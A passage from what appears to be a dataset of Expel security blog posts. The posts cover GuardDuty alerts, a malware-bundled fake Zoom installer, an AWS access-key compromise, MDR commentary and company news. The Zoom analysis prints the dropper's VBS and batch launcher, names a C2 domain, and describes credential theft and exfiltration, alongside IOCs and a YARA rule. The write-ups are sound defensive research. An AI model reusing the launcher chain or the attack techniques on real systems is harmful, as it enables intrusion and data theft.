identified by GuardDuty. Investigating GuardDuty alerts Now that we have an idea of what to expect in a GuardDuty alert, lets take a look at a couple different example alerts. Expel uses the AWS API to consume our customers GuardDuty alerts directly from their AWS Accounts and then we normalize the GuardDuty alert data in Expel Workbench for our analysts. NOTE: These alerts were generated with GuardDutys built-in generate sample findings regression test. Here we get a pretty straightforward explanation in Expel Workbench that our EC2 instance is making connections with a known Tor exit node . Given what we know about these EC2 rules, this alert was simply generated from the VPC flow logs based on an AWS threat list for known Tor exit nodes. This is where those VPC flow logs would really come in handy. Flow logs contain not only the source and destination IP and ports, but also how much traffic was actually passed. Depending on the function of your EC2 instance, this can paint a pretty telling picture as to whether there might be an instance compromise or not. If we need more answers, then youll need a snapshot of that EC2 for a deeper dive or potentially having some other endpoint software such as EDR running inside of that instance. The latter will depend on your organizations risk tolerance for security software running on your production (AKA revenue generating) assets. Next, lets look at another alert that looks similar at a glance but has drastically different implications. This alert isnt quite as straightforward as the previous, but if we revisit what we know about GuardDuty alerts with IAMUser as the ResourceTypeAffected, then we know this originated from a CloudTrail log(s). This is where we might sound the alarm. What youre looking at is someone with API credentials making successful API calls to your AWS account from the Tor anonymizing network. Unless your org has some privacy averse AWS admins or developers, then theres little reason for you see this particular alert. Now you need to do some analysis. Determine if an AWS Identity and Access Management (IAM) user or role was compromised as this could help you determine how those credentials may have been compromised. The key difference between these two are that User credentials are permanent whereas role credentials are temporary (lasting between 1  12 hours). A user compromise might imply leaked API access keys on GitHub or something similar, while a role compromise will generally implicate some other deeper-rooted issue in your environment such a Server Side Request Forgery (SSRF) vulnerability . Lastly, lets look at a real-world GuardDuty alert. In this alert, Expel analysts identified the anomalous detection of an AWS service user (a Continuous Integration/Continuous Delivery IAM user) making a suspicious API call, ListAccessKeys , that should never be attempted by that user given its purpose. Fortunately, GuardDuty has some insight into what API calls a user or role normally makes. This threat actor was able to initially compromise a less privileged user access key for the AWS account and then the attacker pivoted with a variety of methods to expand access and privileges into other IAM users and roles. 4 things to remember when reviewing Amazon GuardDuty alerts GuardDuty alerts are generated based on VPC flow logs, DNS logs, and CloudTrail API logs. Currently, there are two primary classes of GuardDuty alerts: alerts based on DNS or VPC flow in and out of your EC2, and alerts that are generated from suspicious IAM (authenticated) API activity. Many of the GuardDuty alerts are generated based on threat lists of known malicious domains and IPs. Like most security technology, these threat lists may or may not be what you care about in your orgs threat model  consider enriching these alerts with additional decision support such as passive DNS, WHOIS data, or other IP reputation. Keep a close eye out for IAM-related GuardDuty alerts, as this implies theres an authenticated API session to your AWS account.'}) (input_keys={'title'}),
  Example({'title': "Malware operators Zoom'ing in", 'url': 'https://expel.com/blog/malware-operators-zooming-in/', 'date': 'Apr 16, 2020', 'contents': 'Subscribe  EXPEL BLOG Malware operators Zooming in Tips  6 MIN READ  JOSHUA KIM  APR 16, 2020  TAGS: Get technical / Managed detection and response / Security Incident / SOC / Vulnerability Its no surprise that Zooms popularity recently skyrocketed. Whether its remote employees using it as their main way to stay connected or families finding virtual ways to visit with cousins and grandparents, its become a go-to tool for staying in touch as we all practice good social distancing. When I say Zooms popularity is off-the-charts high, Im not kidding . For fun, I compared its recent interests trend to that of other video apps, thanks to some data made available by Google . The TL;DR: It looks like we were collectively interested in the release of Tiger King on Netflix while also learning more about Zoom and how to change the background image. Comparison of common video conferencing applications interest over time. Everyones using Zoom  whats new? Zooms turned into the defacto video conferencing solution  and with that comes both wanted and unwanted attention . While the app provides a great opportunity for us to stay connected, your family, friends and neighbors may not be as security-conscious as you are  making them vulnerable to attack. In this post Ill detail a recent attack the Expel team identified and share some tips that you can follow to make sure your Zoom downloads are safe. In the midst of chaos, there is also opportunity  Sun Tzu ( for clever attackers) Attackers are finding new ways to pounce and capitalize on the current global outbreak to target unsuspecting users via some of their most-loved apps and websites. Which is what we witnessed last week when our SOC identified an incident involving a drive-by download of a fake Zoom installer bundled with malware. If someones downloading Zoom, are they sure they downloaded and installed Zoom directly from their website? With this recent finding, its possible that many may have downloaded the installer from a fake website onto their computers  and social distancing isnt going to help protect you against this particular threat from accessing your sensitive data. Emerging threat: Zoom installers bundled with malware Ill walk you through exactly how this attack happened and will share a few tips for staying safe and avoiding a malware attack like this one. Take a look at the images below. This is a quick comparison of the malicious, self-extracting Zoom installer property details on the left and a legitimate property details of the installer (MD5: 088999a629a254d54a061eeb1cc8b1e2 ) on the right. The property details on the right shows the legitimate installer dropped by the bundled installer on the left. The bundled Zoom installer was hosted from the malicious website hxxp://zoom-free2[.]com/download/zoominstaller.exe . When executed, a copy of a legitimate Zoom installer and malicious files are written to disk within the directory C:zoominst . The dropped files are detailed within the table below. Filename Description Hash nanohost.exe ARKEI/VIDAR Trojan 1465a5f6107ba60876e0b8d8024acdad ZoomInstaller.exe Legitimate installer 088999a629a254d54a061eeb1cc8b1e2 Icon_2.ico Zoom icon file ea3fea284dbc1ed6f173e42cb6987e39 Filename unin1213.vbs Hash 0cc21abbedd1227a1956148b929d051f Content Set WshShell = CreateObject("WScript.Shell") WshShell.Run "object73237.bat", 0, false Filename object73237.bat Hash 3bafbf4633945d2c16523a9312e9d2fd Content @Echo off ZoomInstaller.exe timeout 3 start nanohost.exe Details of the files that are created within C:zoominst folder. While the attack successfully installs and launches a legitimate version of Zoom to avoid user suspicion, it also drops a payload named nanohost.exe on the victims machine that performs malicious activity. nanohost.exe (shown above under filename) is closely related to, and a variant of, the ARKEI/VIDAR information stealer (InfoStealer) malware family. nanohost.exe will query system settings, such as timezone, machine ID, hostname, display settings, hardware information, running process information and saving the queried results output to disk with the filename information.txt located within a randomly generated folder name in %PROGRAMDATA%[RANDOM]filesinformation.txt . The malware is profiling the infected system likely to be used for reference by the attacker. Now lets look at the format of the output data contained within the information.txt file: Version: &lt;INT&gt; Date: &lt;DATE/TIME&gt; MachineID: &lt;MACHINE GUID&gt; GUID: &lt;GUID&gt; [br] Path: &lt;PATH TO FAKE ZOOM INSTALLER&gt; Work Dir: C:ProgramData&lt;RANDOM&gt; [br] Windows: &lt;OS&gt; Computer Name: &lt;HOSTNAME&gt; User Name: &lt;USERNAME&gt; Display Resolution: &lt;RESOLUTION&gt; Display Language: &lt;LOCALE&gt; Keyboard Languages: &lt;LOCALE&gt; Local Time: &lt;DATE/TIME&gt; TimeZone: &lt;TZ&gt; [br] [Hardware] Processor: &lt;CPU SPECS&gt; CPU Count: &lt;CORES&gt; RAM: &lt;MEMORY&gt; VideoCard: &lt;GPU&gt; [br] [Network] IP: &lt;IP&gt; Country: &lt;COUNTRY&gt; City: &lt;CITY&gt; ZIP: &lt;ZIP&gt; Coordinates: &lt;LAT/LONG&gt; ISP: &lt;ISP&gt; [br] [Processes] - System [&lt;PID&gt;]  smss.exe [&lt;PID&gt;]  &lt;PROCESS NAME&gt; [&lt;PID&gt;]   &lt;PROCESS NAME&gt; [&lt;PID&gt;] [br] [Software] &lt;PROGRAM NAME&gt; &lt;VERSION NUMBER&gt; Contents of information.txt As per the [Network] block within the information.txt file, nanohost.exe will perform an IP geolocation lookup of the victim system using ip-api[.]com/line/ . The service returns information about the victims public IP address such as: country, city, zip code, latitude, longitude, ISP and other details. The results are saved to information.txt . Heres an example of what the outbound HTTP POST request to the IP geolocation lookup service looks like: HTTP POST request to IP geolocation lookup service. nanohost.exe is configured to connect to the external, command-and-control (C2) server at wrangellse[.]com for additional execution of arbitrary code. The malware attempts to download additional DLL files staged within the web root directory of the C2 server. The DLL files are written to the victim machine located within the root folder of %PROGRAMDATA% . Based on the naming convention of the DLL files, these are likely used by nanohost.exe to support scraping of sensitive web browser data. Once the DLL files are downloaded from the C2 server, nanohost.exe accesses and retrieves sensitive data from FTP applications installed such as FileZilla and web browsers installed on the victim machine ranging from Internet Explorer, Google Chrome, Mozilla Firefox, Torch, Uran and various other Chromium-based browsers. After successful collection and consolidation of host reconnaissance output, browser and FTP application data, nanohost.exe sends an outbound HTTP POST request with the pertinent data within the request body to wrangellse[.]com . Heres where the malware established an outbound HTTP POST request to the C2 server. Outbound HTTP POST request containing host reconnaissance output The observed network traffic activity generated from nanohost.exe is displayed within the screenshot below. Packet capture filter display on the destination C2 server. An overview of process execution spawned from the malware-bundled Zoom installer is summarized below. Overview of malicious process activity While theres plenty more we could discuss around the capabilities of ARKEI/VIDAR trojan, the important message to re-inforce is that malware operators are continuing to adapt and take full advantage of the current, pandemic circumstances, exploiting popular trends to further push their agenda . If youre using Zoom   then keep these tips in mind as you (or someone you know) is downloading and using the software. For employees, adhere to your organizations IT policy. Dont install unapproved software. And if youre not sure if somethings approved, ask first before downloading it. When using Zoom at home on your own equipment (mobile, PC/laptop), download the software directly from Zooms website and make sure its secure before installing. Dont click on a Zoom download link that was sent to you via SMS (for mobile installation), e-mail or a pop-up window that appeared while browsing the web. Instead, go directly to Zooms website and navigate to their Downloads page . If you arent joining a Zoom meeting through a mobile app, software client or browser extension, go to Zooms official website and use their Join A Meeting option to connect directly to the meeting from your browser. Be sure to follow the same rules in the bullet above. Take the time to read through the privacy and security resource guides made available by Zoom. Were working on another blog post all about recommended, hardening settings for your Zoom meetings to help avoid potential risks. Stay tuned. While attackers may use these strange times as an opportunity to strike, remember that there are measures we can all take to protect ourselves. Stay safe, everyone. Below are charts that can be used as reference. MITRE ATT&amp;CK Matrix Table Initial Access Drive-by Compromise Execution Third-party Software, User Execution Defense Evasion Hidden Window, Software Packing Credential Access Credentials from Web Browsers, Credentials in Files Discovery File and Directory Discovery, Process Discovery, Query Registry, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery Collection Automated Collection, Data from Local System Command And Control Remote File Copy, Standard Application Layer Protocol Exfiltration Automated Exfiltration, Data Compressed, Exfiltration Over Command and Control Channel MITRE ATT&amp;CK Matrix Table Indicators Type Artifact Network zoom-free2[.]com Network wrangellse[.]com Network ip-api[.]com File Path %PROGRAMDATA%vcruntime140.dll File Path %PROGRAMDATA%softokn3.dll File Path %PROGRAMDATA%nss3.dll File Path %PROGRAMDATA%msvcp140.dll File Path %PROGRAMDATA%mozglue.dll File Path %PROGRAMDATA%freebl3.dll File Path %PROGRAMDATA%&lt;RANDOM&gt;filesSoftAuthy File Path c:zoominstunin1213.vbs File Path c:zoominstobject73237.bat File Path c:zoominstnanohost.exe File Path c:zoominstZoomInstaller.exe File Path %USERPROFILE%Downloadszoominstaller.exe Hash 1465a5f6107ba60876e0b8d8024acdad Hash 2c59f16921956b05f97a5b3e208168a6 File Name information.txt File Name passwords.txt File Name ld Indicator of compromise (IOC) Detections YARA Rule rule ZOOMBA { meta: author = "@heyjokim" description = "Self-extracting, Zoom installer bundled with malware" reference = "2c59f16921956b05f97a5b3e208168a6" strings: $s1 = "ZoomInstaller.exe" $s2 = "Release\\sfxrar.pdb" condition: uint16(0) == 0x5A4D and all of ($s*)} Custom detections'}) (input_keys={'title'}),
  Example({'title': 'Managed detection and response (MDR): symptom or ...', 'url': 'https://expel.com/blog/managed-detection-and-response-mdr-symptom-or-solution/', 'date': 'Jan 11, 2018', 'contents': 'Subscribe  EXPEL BLOG Managed detection and response (MDR): symptom or solution? Security operations  5 MIN READ  DAVE MERKEL  JAN 11, 2018  TAGS: Managed detection and response / Managed security / MDR / Selecting tech / Tools Newsflash! Managed security service providers (MSSPs), for the most part, kinda suck . Theyre really good at taking your money. But, if youre looking for security operations capability  yknow, like finding bad guys or investigating a breach  your odds are better if youre looking elsewhere. But wait! We do that! they say. Ummm  no. You actually dont, say their customers (right before they switch providers  again  repeating the cycle of disillusionment anew). Customer dissatisfaction with MSSPs has gotten so bad that a whole new proto-market has popped up that basically  well  it does the things customers thought they were getting (but ultimately didnt) when they first signed their MSSP contract. Industry analysts have even anointed it with its own three-letter acronym: Managed Detection and Response (MDR). The term has been around for a while. In fact, I was a witness to its creation (more on that later). But I still run into lots of folks that dont necessarily understand what MDRs do. And I dont hear a lot of people calling it by that name. It could be because we vendors are craptastic at telling people what we do (Im not sure where we caught that disease but its rampant). But I think theres a different reason: MDR isnt really a market. Its a symptom. Specifically, MDR is a symptom of MSSPs lack of innovation. They whiffed so hard that they let a whole new mini market pop up in their front yard. Full disclosure: Expel is playing in this space, so this is your fair warning that this post is obviously self serving. But, at least Im being honest about it. And it does reflect my thoughts on the state of the universe, for better or for worse. Read on at your own peril. So what do I mean when I say that MDR isnt a market? Ill tell you what I dont mean. I dont mean the capabilities that MDRs provide are useless. If I believed that I wouldnt have founded Expel. What I mean, is that its not a long-term market  at least not in its current form. The emergence of MDRs is a sign that customers want (and need) REAL managed security that  ummmm  manages their security. Theres no doubt that MDRs offer pieces of what companies want  but not (yet) most of what they need: managed security that doesnt suck. First, lets back up and consider how this MDR thing came to pass. It turns out I was there at the beginning. Or, perhaps, more accurately, a beginning since new market trends  even ones with an acronym  rarely have a sole genesis. In any case, heres my specific superhero (villain?) origin story: Once upon a time  in the old country (a shorthand we use at Expel to refer to places we used to work) we had a really advanced endpoint product. It was ugly from a UX perspective (my fault) but we could make it sing. Sadly, many potential customers couldnt. When the evildoers invaded our customers networks we used that product to provide incident response services. Once we had banished the villains and solved the customers problem we would pack up to leave. Then it came to pass that the customer would practically tackle us and beg us to stay: We cant do what you do  and neither can our MSSP. What youre doing is *really* valuable. Can I have some more? they would cry. They huffed and they puffed and after we were hit in the head enough times with this two-by-four, we finally said yknow, there might be a business here. We experimented with a few customers, tailoring a managed threat hunting/investigation offering on top of our endpoint product. We sold a few and decided to make it a business. It grew  and grew  and grew  and focused primarily on using our own endpoint technology and only on finding truly advanced threats. And everybody lived happily ever after. We sold a new managed offering which included our product. The customer didnt have to develop (and  even more difficult  maintain) the expertise to do what we could do. Since then, other MDR vendors have crafted their own similarly shaped origin stories. Perhaps a specific use case, technology or market shaped their offering. They found a niche and conquered it. Theres nothing wrong with that. These MDRs have made the world a better place. Here are four reasons why: 1. They find bad guys and gals: Huzzah! Thats their reason for being, so this shouldnt be surprising. 2. They use modern tech: It sounds obvious but its super important  and many MSSPs dont do it. Most MDR providers use technologies built in the current decade. These modern capabilities offer defenders more options for visibility and they can keep you nimble if you use them properly. 3. Better yet  they use endpoint tech: Double clicking (did I just really say that?) on #2  MDR offerings use endpoint product offerings and data in a completely competent way. This is huge. Endpoint products are often complicated and interpreting the data requires a fair degree of sophistication  but the results are key to modern threat detection and response. 4. Theyre adversary oriented: Some MDR offerings raise awareness of how capable the adversary actually is. This can impact spending and how the business views security. Again, thats a good thing. Still  all of ^these^ things fall under the category of stuff MSSPs should have been doing all along, but arent. But the reason why I dont think MDR is a market  or at least not the end state of the managed security market is that there are some big things that MDRs (as currently defined) dont do. And the fact that they dont do them limits the value pure-play MDRs can deliver. Here are a few examples: They dont use your existing tech: Often, MDR vendors bring some of their own security products to the proverbial table. This can force you to ditch (or ignore) something you already paid for (a network sensor, a SIEM or endpoint tool) regardless of whether or not your existing product is capable. Not awesome. Theyre threat snobs: Frequently, MDR providers focus on advanced threats. Chasing super-elite bad guys makes for great war stories. But less sophisticated individuals acting of their own accord could cripple your business. The time it takes advanced tactics to trickle down to these types of threat actors continues to shrink. Can you afford to be snooty about the threats your solutions providers pay attention to? Compliance  huh? MDRs are often less interested in compliance use cases. While Id never argue that compliance=security, that doesnt eliminate the need to be compliant  particularly in more heavily regulated businesses. Security operations: Ultimately, most organizations need a solid, functioning security operations capability. MDRs arent that. Theyre expensive, almost professional services shaped offerings that are good at finding shiny things, but not so much at addressing your security operations gap. Theyre not transparent: For all the things MDRs are doing that are an improvement on the legacy MSSP market, they still suffer from the black box approach that has frustrated so many MSSP customers. Their value stops when the alerts stop: What did you pay for? What did they do? If there werent bad guys attacking you on a random Tuesday, what value did they provide? If the bad guys stayed home (and no alerts fired) how will you defend your spend to the business? How did they make you better? MDRs should be sucking the air out of the MSSP balloon. But theyre not (yet). Instead, Ive seen scenarios where customers are paying twice, either stitching together multiple MSSPs or layering an MDR on top of an MSSP. Or  perhaps the most troubling scenario Ive seen  a company with two MSSPs who hired a third consulting company to manage their MSSPs. Its kinda like what you find with network or endpoint security technologies  Defense (aka expense) in depth. Why is this happening? Well  MDRs still need to close the gaps I highlighted above. Customers arent looking for an acronym and they dont care much about your origin story. They just want someone to solve their problem. MDRs do some of that today  but they still have some ground to cover starting with using the security investments youve already made. Wouldnt that be great? Yeah, we think so too. Someone should do something about that one of these days.'}) (input_keys={'title'}),
  Example({'title': 'Managed Detection &amp; Response for AWS Access Keys', 'url': 'https://expel.com/blog/finding-evil-in-aws/', 'date': 'Apr 28, 2020', 'contents': 'Subscribe  EXPEL BLOG Managed Detection &amp; Response for AWS Security operations  7 MIN READ  ANTHONY RANDAZZO, BRITTON MANAHAN AND SAM LIPTON  APR 28, 2020  TAGS: CISO / Company news / Get technical / Heads up / Managed security Detection and response in cloud infrastructure is a relatively new frontier. On top of that, there arent many compromise details publicly available to help shape the detection strategy for anyone running workloads in the cloud. Thats why our team here at Expel is attempting to bridge the gap between theory and practice. Over the years, weve detected and responded to countless Amazon Web Services (AWS) incidents, ranging from public S3 bucket exposures to compromised EC2 instance credentials and RDS ransomware attacks. Recently, we identified an incident involving the use of compromised AWS access keys. In this post, well walk you through how we caught the problem, what we observed in our response, how we kicked the bad guy out and the lessons we learned along the way. Compromised AWS access keys: How we caught em We first determined there was something amiss thanks to an Expel detection using CloudTrail logs. Here at Expel, we encourage many of our customers who run on AWS to use Amazon GuardDuty. But weve also taken it upon ourselves to develop detection use cases against CloudTrail logs . GuardDuty does a great job of identifying common attacks, and weve also found CloudTrail logs to be a great source of signal for additional alerting thats more specific to an AWS service or an environment. It all started with the alert below, telling us that EC2 SSH access keys were being generated ( CreateKeyPair / ImportKeyPair ) from a suspicious source IP address. Initial lead Expel alert Howd we know it was suspicious? Weve created an orchestration framework that allows us to launch actions when certain things happen. In this case, when an alert fired an Expel robot picked it up and added additional information. This robot uses a third-party enrichment service for IPs (in this case, our friends at ipinfo.io ). More on our robots here shortly. Keep in mind that these are not logins to AWS per se. These are authenticated API calls with valid IAM user access keys. API access can be restricted at the IP layer, but it can be a little burdensome to manage in the IAM Policy. As you can see in the alert shown above, there was no MFA enforced for this API call. Again, this was not a login, but you can also enforce MFA for specific API calls through the IAM Policy . Weve observed only a few AWS customers using either of these controls. Another interesting detail from this alert was the use of the AWS Command Line Interface (CLI) . This isnt completely out of the norm, but it heightened our suspicion a bit because its less common than console (UI) or AWS SDK access. Additionally, we found this user hadnt used the AWS CLI in recent history, potentially indicating a new person was using these credentials. The manual creation of an access key was also an atypical action versus leveraging infrastructure as code to manage keys (i.e. CloudFormation or Terraform). Taking all of these factors into consideration, we knew we had an event worthy of additional investigation. Cue the robots, answer some questions Our orchestration workflows are critically important  they tackle highly repetitive tasks, that is answer questions an analyst would ask about an alert, on our behalf as soon as the alert fires. We call these workflows our robots. When we get an AWS alert from a customers environment, we have three consistent questions we like to answer to help our analysts determine if its worthy of additional investigation (decision support): Did this IAM principal (user, role, etc.) assume any other roles? What AWS services does this principal normally interact with? What interesting API calls has this principal made? So, when the initial lead alert for the SSH key generation came in, we quickly understood that role assumption was not in play for this compromise. If the user had assumed roles, it would have been key to identity and include them in the investigation. Instead, we saw the image below: Expel AWS AssumeRole Robot Once we knew access was limited to this IAM user, we wanted to know what AWS services this principal generally interacts with. Understanding this helps us spot outlier activity thats considered unusual for that principal. Seeing the very limited API calls to other services further indicated that something nefarious might be going on. Expel AWS Service Interaction Robot Finally, we wanted to see what interesting API calls the principal made. From a detection perspective, we define interesting API calls in this context to be mostly anything that isnt Get*, List*, Describe* and Head*. This enrichment returned 344 calls to the AuthorizeSecurityGroupIngress API from the AWS CLI user-agent. This is really the tipping point for considering this a security incident. Expel AWS Interesting API Robot How we responded After we spotted the attack, we needed to scope this incident and provide the measures for containment. We framed our response by asking the primary investigative questions. Our initial response was going to be limited to determining what happened in the AWS control plane (API). CloudTrail was our huckleberry for answering most of our questions. What credentials did the attacker have access to? How long has the attacker had access? What did the attacker do with the access? How did the attacker get access? What credentials did the attacker have access to? By querying historical CloudTrail events for signs of this attacker, Expel was able to identify that they had access to a total of eight different IAM user access keys, and was active from two different IPs. If we recall from earlier, we were able to use our robot to determine that no successful AssumeRole calls were made, limiting our response to these IAM users. How long has the attacker had access? CloudTrail indicated that most of the access keys had not been used by anyone else in the past 30 days thus we can infer that the attacker likely discovered the keys recently. What did the attacker do with the access? Based on observed API activity, the attacker had a keen interest in S3, EC2 and RDS services as we observed ListBuckets , DescribeInstances and DescribeDBInstances calls for each access key, indicating an attempt to see which of these resources was available to the compromised IAM user. As soon as the attacker identified a key with considerable permissions, DescribeSecurityGroups was called to determine the level of application tier access (firewall access) into the victims AWS environment. Once these groups were enumerated, the attacker backdoored all of the security groups with a utility similar to aws_pwns backdoor_all_security_group script . This allowed for any TCP/IP access into the victims environment. Additional AuthorizeSecurityGroupIngress calls were made for specific ingress rules for port 5432 (postgresql) and port 1253, amounting to hundreds of unique Security Group rules created. These enabled the attacker to gain network access to the environment and created additional risks by exposing many AWS service instances (EC2, RDS, etc.) to the internet. A subsequent DescribeInstances call identified available EC2 instances to the IAM user. The attacker then created a SSH key pair (our initial lead alert for CreateKeyPair ) for an existing EC2 instance. This instance was not running at the time so the attacker turned it on via a RunInstances call. Ultimately, this series of actions resulted in command line access to the targeted EC2 instance, at which point visibility can be a challenge without additional OS logging or security products to investigate instance activity. How did the attacker get credentials? While frustrating, its not always feasible to identify the root cause of an incident for a variety of reasons. For example, sometimes the technology simply doesnt produce the data necessary to determine the root cause. In this case, using the tech we had available to us, we werent able to determine how the attacker gained credentials, but we have the following suspicions: Given multiple credentials were compromised, its likely they were found in a public repository such as git, an exposed database or somewhere similar. Its also possible credentials were lifted from developer machines directly, for example the AWS credentials file. We attempted to confirm these, but couldnt get to an answer in this case. Though unfortunate, it offers an opportunity to work with the victim to improve visibility. For reference, below are the Mitre ATT&amp;CK Cloud Tactics observed during Expels response. Initial Access Valid Accounts Persistence Valid Accounts, Redundant Access Privilege Escalation Valid Accounts Defensive Evasion Valid Accounts Discovery Account Discovery Cloud Security Threat Containment By thoroughly scoping the attackers activities, we were able to deliver clear remediation steps. This included: Deleting the compromised access keys for the eight involved IAM user accounts; Snapshotting (additional forensic evidence) and rebuilding the compromised EC2 instance; Deleting the SSH keys generated by the attacker; And deleting the hundreds of Security Group ingress rules created by the attacker. Resilience: Helping our customer improve their security posture When we say incident response isnt complete without fixing the root of the problem  we mean it . One of the many things that makes us different at Expel is that we dont just throw alerts over the fence. That would only be sort of helpful to our customers and puts us in a position where wed have to tackle the same issue on another day  and likely on many more days after that. Were all about efficiency here. Thats why we provide clear recommendations for how to solve issues and what actions a customer can take to prevent these kinds of attacks in the future. Everybody wins (except for the bad guys). While we werent certain how the access keys were compromised in the first place, below are the resilience recommendations we gave our customer once the issue was resolved. Expel AWS Resilience (1) If the IAM user is unused, then it probably doesnt need to remain active in your account. We made this recommendation because these access keys hadnt been in use by anyone other than the attacker in the previous 30 days. Expel AWS Resilience (2) Since the access keys for this IAM principal were at least 30 days old given that no activity occurred from a legitimate user, it was time to do some tidying up, so to speak. If you need that user, rotate the access keys on a regular basis. Expel AWS Resilience (3) We noticed that this IAM user had far too many EC2 permissions and thought this resilience measure was in order. We also shared that it would be far safer to delegate those EC2 permissions with an IAM role. Lessons learned Fortunately, we were able to disrupt this attack before there was any serious damage, but it highlighted the very real fact that cloud infrastructure  whether youre running workloads on AWS or somewhere else  is a prime target for attackers. As with every incident, we took some time to talk through what we discovered through this investigation and are sharing our key lessons here. AWS customers must architect better security in the cloud. That is, create greater visibility into the EC2 and other infrastructure identified in the shared responsibility model. You cant find evil if the analysts dont know what to look for  train, train some more, and then when youre done training, train again. Special thanks to Scott Piper ( @0xdabbad00 ) and Rhino Security Labs ( @RhinoSecurity ) for their contributions to AWS security research. While security in the cloud is still relatively in its infancy, the same can be said for the attacker behaviors  much of what we observed here and in the past were elementary attack patterns. There are additional automated enrichment opportunities. Weve started working on a new AWS robotic workflow to summarize historical API usage data for the IAM principal and will compare it to the access parameters of the alert. Be on the lookout for an additional blog post in the future for our automated AWS alert enrichments. Until then, check out our other blogs to learn more about how we leverage AWS cloud security for our customers, along with tips and tricks for ramping up your own orgs security when it comes to cloud.'}) (input_keys={'title'}),
  Example({'title': 'Meet us at Moscone Expel makes its #RSAC debut!', 'url': 'https://expel.com/blog/expel-makes-its-rsa-debut/', 'date': 'May 12, 2022', 'contents': 'Subscribe  EXPEL BLOG Meet us at Moscone Expel makes its #RSAC debut! Expel insider  2 MIN READ  KELLY FIEDLER  MAY 12, 2022  TAGS: Cloud security / Company news / MDR / Tech tools Expletives have attended RSA Conference (RSAC) for years, and many attended before they were Expletives  not to mention, before there was an Expel. But this year is different. For the first time, Expel is headed to Moscone Center as an exhibitor. You could say were pretty excited. Why are we so over-the-moon about this? A few reasons (and were not just talking about the free swag or the trolley rides). Its a pivotal time in the detection and response market space. Mostly, because its also a confusing time  full of options (MDR and XDR), uncertainty, and noise. With a constantly evolving threat landscape, businesses need security partners that arent just answering their questions today but are looking ahead to prepare for the questions of tomorrow. More threats with increasing complexity mean businesses have to keep up and make sense of all the noise  fast. Thats why weve made it our mission to make security easy to understand, easy to use, and easy to continuously improve. Our promise is to show you that security can be delightful. What does that look like? Expel partners with you to create an approach thats tailored to your environment, your people, and your processes. We integrate with your existing tech to drive greater value, then through automation quickly learn to analyze and correlate alerts across your systems and attack surfaces, 247. Our friendly bots, Josie and Ruxie, free up our analysts so they can make the quick, well-informed decisions best suited to humans. Josie analyzes alerts as they come in for triage, surfacing the most important ones, and Ruxie gives analysts critical information about threats so they can strategize on the best remediation approach. Its how tech and people should work together. The result? A platform that makes it easier to detect, understand, and fix issues fast so business risk is managed. Breathe easier knowing your team has the answers they need, when they need them. Really, its security that makes sense. We cant wait to share this approach to security with you. Just like in years past, RSAC is a great place to connect with old friends, shake new hands, and of course, talk security. The difference is that this year, well do it at our own booth. Stop by the Expel booth (S649) in the South Hall to meet our crew, check out a demo, enjoy some live freestyle rap from YouTube sensation, Harry Mack (seriously!). While youre there, catch up with Josie and Ruxie  you might even snag a cool plushie Before the conference, get a sneak-peek at what its like to work with Expel with this overview video . Ready to talk shop? Go ahead and schedule a meeting .'}) (input_keys={'title'}),
  Example({'title': 'Mission matters: watch your signals', 'url': 'https://expel.com/blog/mission-matters-watch-signals/', 'date': 'Sep 28, 2017', 'contents': 'Subscribe  EXPEL BLOG Mission matters: watch your signals Talent  3 MIN READ  YANEK KORFF  SEP 28, 2017  TAGS: Employee retention / Great place to work / Management / Mission I was at a company-wide all hands meeting and one of the executives came on stage to rally the troops, like you do. There was music, there was fanfare, there was applause and I probably wanted to be elsewhere. Not into the cyber-rockstar thing. Still, dont let the show fool you  he was a sharp executive. Particularly in his understanding of capital market dynamics: the push and pull of investor confidence, industry headwinds and tailwinds, and the undercurrent of human emotion that fuels the availability of capital in the first place. In the course of his address, the statement our product is our stock price happened to come out. No wait, that was on Silicon Valley . But close enough. Yknow, if youre a shareholder youre damn right it is. In fact, if youre at the company primarily because of your equity that view is pretty compelling. If the stock price goes up, you win. Its easy to align around that mission if youre holding the right cards. But what if youre not? If you happen to be, say on the security team, and your vested interest in the company revolves more around what it does for customers than what it yields to investors, what does that message do for you? If youre thinking absolutely nothing, it turns out its a little worse than that. Youll come out of that all-hands even less motivated than you were when you walked in. Hearing that your companys raison dtre is about putting dollars into already dollar-laden pockets is simply not a compelling message (or a compelling reason to come to work). A message like were here to keep our customers safe, or we want to level the playing field, or even were here to stick our finger in Saurons eye or die trying, thats what youre there for. Well, thats great and all, but if youre in charge of security at a larger company whose mission actually has nothing to do with security, then it falls on you to make sure your team understands that THEIR mission isnt quite so transactional. Here are four things you can start working on today to set the tone for security in your organization that will have a lasting impact on your team. 1. Check compensation Mission matters, but so do basic financials that allow for a place to live and eat. No, the world is not so simplistic as Maslow would have you believe , but you know as well as I how competitive the security space is. You cant turn on a cyber Twitter feed without at least three  OMG TALENT SHORTAGE  headlines scrolling by these days. Over-dramatized clickbait as it may be, your security staff can likely get a job somewhere else and make more money at any point. Get access to market data and make sure you, your boss, and your HR team are educated on the realities of the security talent pool. 2. Define your mission and vision Why do you exist? What exactly are your doing for your customers? How do you know when youre successful? Theres no end of information about how to establish these so Im not going to rehash that here, but its worth taking time out of your day, and with the support of your team, to ensure everyone is aligned on these two statements. 3. Check your culture The #1 pitfall of mission/vision efforts at any company is not letting the words you write down alter behavior. Netflix captures this best in their deliberate, documented approach to culture. Do your decisions align with your culture? Do they align with your mission, and will they help you achieve your vision? Many companies have value statements, but often these written values are vague and ignored. The real values of a firm are shown by who gets rewarded or let go.  Netflix 4. Tell stories It may feel a bit weird to jump from b-school propaganda to your kids pre-bedtime activities, but being able to tell a great story is an essential part of management in general and especially important in high-stress, high-impact work like security analysis and incident response. Not only do stories allow your security team to relive and celebrate their achievements ( versus pushing happiness past the cognitive horizon ), it builds credibility across the organization and reminds everyone what theyre working for. One step at a time Realistically, theres no shortage of work for you to tackle. Taking a step back to focus on something as high level as mission or vision might look like a waste of time. For some, dealing with HR is a trial unto itself that youll want to put off as long as possible. If nothing else, you probably already have a staff meeting every week. Next week, add a story. If a particularly good one pops up, find a way to share it with teams outside your organization. Get a few wins under your belt and build up the energy to tackle some of the higher level (but likely more impactful) work of 1  3. Best of luck!  This is the third part of a five part series on key areas of focus to improve security team retention. Read from the beginning, 5 ways to keep your security nerds happy , or continue to part four .'}) (input_keys={'title'}),
